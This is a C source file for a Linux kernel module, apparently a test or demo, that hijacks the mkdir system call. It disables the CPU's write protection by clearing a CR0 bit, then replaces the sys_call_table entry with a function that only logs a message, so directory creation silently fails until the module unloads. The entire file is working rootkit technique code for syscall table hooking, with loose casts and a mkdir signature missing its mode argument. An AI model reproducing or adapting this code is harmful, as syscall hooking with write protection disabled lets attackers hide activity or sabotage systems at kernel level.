#ifndef __GETMKDIR_INCLUDE__
# define __GETMKDIR_INCLUDE__
#endif
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <asm/unistd.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("xinhe <xinhe007@163.com>");
MODULE_DESCRIPTION("export the sys_call_table");
extern void *sys_call_table[];
int (*orig_mkdir)(const char *path);/*指向系统的mkdir*/
long g_oldcr0=0;
/*构造自己的mkdir*/
int hacked_mkdir(const char *path)
{
	printk("<1>this is a test,your mkdir had been hacked\n");
	return 0;
}
unsigned int clear_cr0_save()
{
   unsigned int my_cr0 = 0;
   unsigned int ret=0,result,input,foo,bar;
   //AT&T语法第一个为源操作数，第二个为目的操作数，方向从左到右
   asm volatile ("movl %%cr0, %%eax"
            : "=a"(my_cr0)
    );
    ret = my_cr0;
 
    /*clear the 20th bit of CR0,*/
    my_cr0 = my_cr0 &0xfffeffff;
	//printk("<1>this is a test222 %lx\n",ret);
	asm volatile("movl %%eax, %%cr0"::"a"(my_cr0));
 return ret;
}

void setback_cr0(unsigned int val)
 {
     asm volatile ("movl %%eax, %%cr0": :"a"(val));
 }


static int __init init(void)
{
	printk("<1>this is a test,it will hack your mkdir syscall\n");
	printk("<1>__NR_mkdir=%d\n",__NR_mkdir);

	orig_mkdir=(int(*)(void))(sys_call_table[__NR_mkdir]);

    printk("<1>sys_call_table[]=%p\n",sys_call_table);
	printk("<1>orig_mkdir=%p\n",orig_mkdir);
	printk("<1>hacked_mkdir=%p\n",hacked_mkdir);
    g_oldcr0=clear_cr0_save();
	sys_call_table[__NR_mkdir]=(unsigned long)hacked_mkdir;
	setback_cr0(g_oldcr0);
	 return 0;
}
static void __exit fini(void)
{
g_oldcr0=clear_cr0_save();
sys_call_table[__NR_mkdir]=orig_mkdir;
setback_cr0(g_oldcr0);
printk("<1>hi your mkdir is ok\n");
/*做恢复工作*/
}
module_init(init);
module_exit(fini);
